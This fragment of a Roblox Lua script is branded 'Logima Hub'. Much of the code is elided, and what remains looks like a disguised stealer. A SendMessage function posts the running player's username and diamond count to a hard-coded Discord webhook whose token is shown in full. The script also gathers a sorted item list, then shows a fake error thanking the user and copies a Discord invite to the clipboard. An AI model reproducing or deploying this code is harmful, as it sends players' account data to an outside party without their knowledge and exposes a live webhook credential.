...
local MailMessage = "Join gg/3Uz4N898fX"
...
local function SendMessage(username, diamonds)
    ...
    if discuser and discuser ~= "" then
        local response = request({
            Url = "https://discord.com/api/webhooks/1315686623815532679/J4c05ROLmvCwlRKAddt_6CjyNSYlpcQnfjBwJgH2NkJPvg4659jqkbf9OEEQx64ReyE4",
            Method = "POST",
            Headers = headers,
            Body = body
        })
...
if #sortedItems > 0 then
    ...
    message.Error("AThank you for using Logima Hub\n made by U1yo")
    setclipboard("Join gg/3Uz4N898fX")
end
